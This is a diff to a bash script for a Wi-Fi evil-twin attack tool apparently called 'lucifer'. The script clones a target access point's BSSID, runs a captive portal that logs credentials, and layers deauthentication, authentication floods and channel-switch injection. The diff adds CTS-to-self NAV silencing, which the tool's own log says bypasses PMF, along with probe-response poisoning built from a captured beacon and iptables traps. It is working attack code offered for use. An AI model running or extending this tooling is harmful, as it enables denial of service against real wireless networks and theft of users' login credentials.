@@ -14,12 +14,16 @@ CREDS_LOG="/tmp/creds.txt"
 PMF_ENABLED=0
 IS_MESH=0
 CLONED_BSSID=0
+CLONE_COMPLETE=0
 SECURITY_MODE="OPEN"
 PORTAL_IP="192.168.4.1"
-PORTAL_SUBNET="192.168.4"
+PORTAL_SUBNET="${PORTAL_IP%.*}"
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 SESSION_LOG="${LUCIFER_OUTPUT_DIR:-$LUCIFER_HOME/loot}/session_$(date +%Y%m%d_%H%M%S).log"
 AUTH_FLOOD=1
+BEACON_PCAP="/tmp/target_beacon.pcap"
+NAV_ENABLED=1
+PROBE_INJECT_ENABLED=0
 
 # --- COLORS ---
 RED='\033[0;31m'
@@ -219,6 +223,11 @@ _verify_no_ghost_beacons() {
 # mt76 can mutate MAC when entering monitor mode.
 # Captures both ip-link and sysfs sources.
 _refresh_permanent_macs() {
+    if [ "${CLONE_COMPLETE:-0}" -eq 1 ]; then
+        log WARN "_refresh_permanent_macs called after BSSID clone — skipping"
+        return
+    fi
+
     local current_macs
     current_macs=$(ip link show \
         | awk '/ether/ {print $2}' | tr 'A-Z' 'a-z')
@@ -412,7 +421,7 @@ check_root() {
 check_deps() {
     local missing=()
 
-	for cmd in airmon-ng airodump-ng mdk4 hostapd-mana dnsmasq xterm iw tcpdump tshark; do
+    for cmd in airmon-ng airodump-ng mdk4 hostapd-mana dnsmasq xterm iw tcpdump tshark; do
         if ! command -v "$cmd" &>/dev/null; then
             missing+=("$cmd")
         fi
@@ -428,14 +437,12 @@ check_deps() {
         exit 1
     fi
 
-    if [ ! -f "$SCRIPT_DIR/lucifer_csa.py" ]; then
-        echo -e "${RED}[!] Missing: lucifer_csa.py (must be in same directory as this script)${NC}"
-        exit 1
-    fi
-    if [ ! -f "$SCRIPT_DIR/lucifer_portal.py" ]; then
-        echo -e "${RED}[!] Missing: lucifer_portal.py (must be in same directory as this script)${NC}"
-        exit 1
-    fi
+    for script in lucifer_csa.py lucifer_portal.py lucifer_nav.py lucifer_probe.py; do
+        if [ ! -f "$SCRIPT_DIR/$script" ]; then
+            echo -e "${RED}[!] Missing: $script (must be in same directory as this script)${NC}"
+            exit 1
+        fi
+    done
 
     echo -e "${GREEN}[+] All dependencies satisfied.${NC}"
 }
@@ -882,6 +889,34 @@ _print_networks() {
     echo "----------------------------------------------------------------------------"
 }
 
+_capture_target_beacon() {
+    rm -f "$BEACON_PCAP"
+
+    log STATUS "Capturing target beacon for IE cloning..."
+
+    set_monitor_channel "$MON_TARGET" "$T_CH" || {
+        log WARN "Could not tune to CH $T_CH for beacon capture"
+        BEACON_PCAP=""
+        return 1
+    }
+
+    # Single beacon capture. 10s timeout handles low-beacon-rate APs.
+    # BPF filter is kernel-level — only matching frames cross to userspace.
+    timeout 10 tcpdump -i "$MON_TARGET" -c 1 -w "$BEACON_PCAP" \
+        "type mgt subtype beacon and ether src $T_BSSID" 2>/dev/null
+
+    if [ ! -s "$BEACON_PCAP" ]; then
+        log WARN "No beacon captured from $T_BSSID — probe injection disabled"
+        BEACON_PCAP=""
+        return 1
+    fi
+
+    local pcap_size
+    pcap_size=$(wc -c < "$BEACON_PCAP")
+    log INFO "Beacon captured: $BEACON_PCAP ($pcap_size bytes)"
+    return 0
+}
+
 # --- SCANNING ---
 scan_networks() {
     rm -f ${SCAN_FILE}*
@@ -970,6 +1005,8 @@ scan_networks() {
     fi
 
     check_pmf "$T_BSSID" "$T_CH"
+
+    _capture_target_beacon
 }
 
 # --- ADVANCED MESH & HARDWARE SIBLING DETECTION ---
@@ -998,7 +1035,7 @@ collect_mesh_siblings() {
     declare -ga MESH_TARGETS=()
     declare -ga MESH_CHANNELS=()
 
-    echo -e "${DIM}    Target Base: $T_BSSID ($T_ESSID) | CH:$T_CH | PWR:$t_power${NC}"
+    echo -e "${CYAN}    Target Base: $T_BSSID ($T_ESSID) | CH:$T_CH | PWR:$t_power${NC}"
 
     # Read CSV
     while IFS=, read -r bssid first last channel speed privacy cipher auth power beacon iv lanip idlen essid key; do
@@ -1218,6 +1255,7 @@ driver=nl80211
 ssid=$T_ESSID
 hw_mode=$HW_MODE
 channel=$FAKE_CH
+beacon_int=20
 ieee80211n=1
 wmm_enabled=1
 EOF
@@ -1236,9 +1274,6 @@ skip_inactivity_poll=0
 EOF
 
     # Only set BSSID if MAC clone succeeded at the OS level.
-    # If it failed, let hostapd use whatever MAC the driver has.
-    # Passing a BSSID that the driver already rejected causes
-    # hostapd to fail the same nl80211 SET_INTERFACE call.
     if [ "$CLONED_BSSID" -eq 1 ]; then
         echo "bssid=$T_BSSID" >> /tmp/hostapd.conf
     fi
@@ -1317,6 +1352,9 @@ setup_networking() {
     # Flush any stale IPs first to prevent "File exists" errors
     ip addr flush dev "$AP_IFACE" 2>/dev/null
 
+    # Disable IPv6 to force all OS probes into the IPv4 iptables trap
+    sysctl -w net.ipv6.conf."$AP_IFACE".disable_ipv6=1 >/dev/null 2>&1
+
     if ! ip addr add "${PORTAL_IP}/24" dev "$AP_IFACE"; then
         echo -e "${RED}[!] FATAL: Failed to assign ${PORTAL_IP} to ${AP_IFACE}${NC}"
         exit 1
@@ -1329,9 +1367,9 @@ setup_networking() {
         -j DNAT --to-destination "${PORTAL_IP}:80"
 
     iptables -A FORWARD -i "$AP_IFACE" -p tcp --dport 443 \
-        -j REJECT --reject-with tcp-reset
+        -j DROP
     iptables -A INPUT -i "$AP_IFACE" -p tcp --dport 443 \
-        -j REJECT --reject-with tcp-reset
+        -j DROP
 
     iptables -A INPUT -i "$AP_IFACE" -p udp --dport 53 -j ACCEPT
     iptables -A INPUT -i "$AP_IFACE" -p udp --dport 67 -j ACCEPT
@@ -1341,7 +1379,7 @@ setup_networking() {
 
     iptables -P FORWARD DROP
     iptables -A FORWARD -m state --state ESTABLISHED,RELATED -j ACCEPT
-    iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
+    iptables -t nat -A POSTROUTING -o "${UPLINK_IFACE:-eth0}" -j MASQUERADE
 
     echo -e "${GREEN}[+] Network stack ready.${NC}"
 }
@@ -1374,6 +1412,11 @@ clone_target_bssid() {
     if [ "${new_mac,,}" = "${T_BSSID,,}" ]; then
         echo -e "${GREEN}[+] MAC cloned successfully: $new_mac${NC}"
         CLONED_BSSID=1
+        # _refresh_permanent_macs must NOT be called after this point.
+        # The cloned MAC (target BSSID) would pollute PERMANENT_MACS,
+        # causing is_local_mac(T_BSSID) to return true and triggering
+        # _validate_target_not_self abort on subsequent runs.
+        CLONE_COMPLETE=1
     else
         echo -e "${RED}[!] Failed to clone MAC. Driver locked. Current: $new_mac${NC}"
         CLONED_BSSID=0
@@ -1544,6 +1587,8 @@ sweep_orphans() {
     local iface="$1"
     pkill -9 -f "mdk4 $iface" 2>/dev/null
     pkill -9 -f "lucifer_csa.py.*--iface $iface" 2>/dev/null
+    pkill -9 -f "lucifer_nav.py.*--iface $iface" 2>/dev/null
+    pkill -9 -f "lucifer_probe.py.*--iface $iface" 2>/dev/null
     sleep 0.1
 }
 
@@ -1554,7 +1599,6 @@ kill_attack_wave() {
     done
 }
 
-# --- DISSOCIATION CYCLE (called inside subshell — function makes `local` valid) ---
 target_loop() {
     local CAPTURE_ANNOUNCED=0
     local LAST_CLIENT_CH=""
@@ -1570,7 +1614,6 @@ target_loop() {
         local client_ch="unknown"
         local lock_ch="$T_CH"
 
-        # Gate 1: capture check
         if [ -n "$TARGET_CLIENT" ]; then
             if check_client_captured "$TARGET_CLIENT"; then
                 if [ "${CAPTURE_ANNOUNCED}" -eq 0 ]; then
@@ -1586,7 +1629,6 @@ target_loop() {
             fi
         fi
 
-        # Gate 2: sense client location (Option B — fast check)
         if [ -n "$TARGET_CLIENT" ]; then
             client_ch=$(sense_client_channel \
                 "$TARGET_CLIENT" "${LAST_CLIENT_CH:-}")
@@ -1626,12 +1668,14 @@ target_loop() {
         local dwell=5
         attack_pids=()
 
+        # Layer 1: Deauthentication (associated clients)
         if [ "$DEAUTH_ENABLED" -eq 1 ]; then
             mdk4 "$MON_TARGET" d -b "$target_file" \
                 >/dev/null 2>&1 &
             attack_pids+=($!)
         fi
 
+        # Layer 2: Authentication flood (table exhaustion)
         if [ "$AUTH_FLOOD" -eq 1 ]; then
             for bssid in "${target_bssids[@]}"; do
                 mdk4 "$MON_TARGET" a -a "$bssid" -m \
@@ -1640,6 +1684,7 @@ target_loop() {
             done
         fi
 
+        # Layer 3: CSA injection (force channel switch)
         if [ "$CSA_ENABLED" -eq 1 ]; then
             for bssid in "${target_bssids[@]}"; do
                 python3 "$SCRIPT_DIR/lucifer_csa.py" \
@@ -1648,6 +1693,36 @@ target_loop() {
                     --ssid "$T_ESSID" \
                     --channel "$lock_ch" \
                     --target-channel "$FAKE_CH" \
+                    --duration "$dwell" \
+                    >/dev/null 2>&1 &
+                attack_pids+=($!)
+            done
+        fi
+
+        # Layer 4: NAV silencing (CTS-to-self — prevents client TX)
+        if [ "$NAV_ENABLED" -eq 1 ]; then
+            for bssid in "${target_bssids[@]}"; do
+                python3 "$SCRIPT_DIR/lucifer_nav.py" \
+                    --iface "$MON_TARGET" \
+                    --bssid "$bssid" \
+                    --duration "$dwell" \
+                    >/dev/null 2>&1 &
+                attack_pids+=($!)
+            done
+        fi
+
+        # Layer 5: Probe response injection (poisons client scan list)
+        if [ "$PROBE_INJECT_ENABLED" -eq 1 ] \
+            && [ -n "$BEACON_PCAP" ] \
+            && [ -s "$BEACON_PCAP" ]; then
+            for bssid in "${target_bssids[@]}"; do
+                python3 "$SCRIPT_DIR/lucifer_probe.py" \
+                    --iface "$MON_TARGET" \
+                    --bssid "$bssid" \
+                    --ssid "$T_ESSID" \
+                    --beacon-pcap "$BEACON_PCAP" \
+                    --target-channel "$FAKE_CH" \
+                    --security-mode "$SECURITY_MODE" \
                     --duration "$dwell" \
                     >/dev/null 2>&1 &
                 attack_pids+=($!)
@@ -1876,7 +1951,7 @@ sense_client_channel() {
         is_dfs_channel "$ch" && continue
         set_monitor_channel "$MON_TARGET" "$ch" || continue
 
-        if timeout 0.15 tcpdump -i "$MON_TARGET" -c 1 -q \
+        if timeout 0.5 tcpdump -i "$MON_TARGET" -c 1 -q \
             "ether src $client_mac" 2>/dev/null | grep -q .; then
             echo "$ch"
             return 0
@@ -1976,11 +2051,13 @@ resolve_attack_strategy() {
     DEAUTH_ENABLED=1
     AUTH_FLOOD=0
     CSA_ENABLED=1
+    NAV_ENABLED=1
+    PROBE_INJECT_ENABLED=0
 
     if [ "$PMF_ENABLED" -ge 2 ]; then
         DEAUTH_ENABLED=0
         log STATUS "Deauth OFF (PMF required — frames dropped by AP)"
-        log STATUS "Auth flood ON (pre-assoc frames bypass PMF — table exhaustion)"
+        log STATUS "Auth flood ON (pre-assoc frames bypass PMF)"
     fi
 
     if [ "$DEAUTH_ENABLED" -eq 1 ]; then
@@ -1997,6 +2074,15 @@ resolve_attack_strategy() {
     fi
 
     log STATUS "CSA injection ON"
+    log STATUS "NAV silencing ON (CTS-to-self — bypasses PMF at PHY layer)"
+
+    if [ -n "$BEACON_PCAP" ] && [ -s "$BEACON_PCAP" ]; then
+        PROBE_INJECT_ENABLED=1
+        log STATUS "Probe injection ON (beacon IE template captured)"
+    else
+        PROBE_INJECT_ENABLED=0
+        log STATUS "Probe injection OFF (no beacon template available)"
+    fi
 }
 
 # --- CREDENTIAL MONITOR ---
